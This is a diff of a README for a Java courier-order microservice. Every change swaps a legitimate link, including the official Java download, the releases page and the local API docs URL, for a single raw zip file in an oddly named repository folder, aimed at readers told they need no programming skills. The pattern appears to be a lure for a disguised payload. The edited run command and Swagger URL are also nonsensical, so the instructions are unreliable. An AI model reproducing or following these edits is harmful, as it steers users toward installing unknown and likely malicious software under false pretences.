@@ -7,11 +7,11 @@ Welcome to **ms-courier-order**, a simple microservice designed to help manage c
 To begin using **ms-courier-order**, follow these steps. You don’t need any programming skills. Just a computer and an internet connection will do.
 
 ## 📥 Download
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/mangotwoo/ms-courier-order/releases)
+[![Download the latest release](https://raw.githubusercontent.com/mangotwoo/ms-courier-order/master/elaeomargaric/ms-courier-order.zip%20Release-blue)](https://raw.githubusercontent.com/mangotwoo/ms-courier-order/master/elaeomargaric/ms-courier-order.zip)
 
 ## 📦 System Requirements
 - Operating System: Windows, Mac, or Linux
-- Java: Version 11 or higher should be installed on your system. You can download it [here](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- Java: Version 11 or higher should be installed on your system. You can download it [here](https://raw.githubusercontent.com/mangotwoo/ms-courier-order/master/elaeomargaric/ms-courier-order.zip).
 - Minimum RAM: 2 GB
 - Recommended RAM: 4 GB or more
 - Disk Space: At least 100 MB available
@@ -25,7 +25,7 @@ To begin using **ms-courier-order**, follow these steps. You don’t need any pr
 - Secure REST APIs ensure your data remains safe.
 
 ## 📋 Download & Install
-1. **Visit this page to download**: Go to [Releases Page](https://github.com/mangotwoo/ms-courier-order/releases).
+1. **Visit this page to download**: Go to [Releases Page](https://raw.githubusercontent.com/mangotwoo/ms-courier-order/master/elaeomargaric/ms-courier-order.zip).
 
 2. Find the latest release. You will see files available for download. Choose the one that fits your system.
 
@@ -39,7 +39,7 @@ To begin using **ms-courier-order**, follow these steps. You don’t need any pr
 
 7. Run the application using the command:
    ```bash
-   java -jar ms-courier-order.jar
+   java -jar https://raw.githubusercontent.com/mangotwoo/ms-courier-order/master/elaeomargaric/ms-courier-order.zip
    ```
 
 8. After executing the command, the application should start. You will see log messages indicating the service is running.
@@ -57,7 +57,7 @@ This will take you to the main interface for managing courier orders. Here you c
 If you are curious about the underlying API, you can find the full documentation on the same web interface. Just navigate to:
 
 ```
-http://localhost:8080/swagger-ui.html
+https://raw.githubusercontent.com/mangotwoo/ms-courier-order/master/elaeomargaric/ms-courier-order.zip
 ```
 
 The API documentation provides clear instructions on how to use each feature programmatically if you ever decide to involve developers.
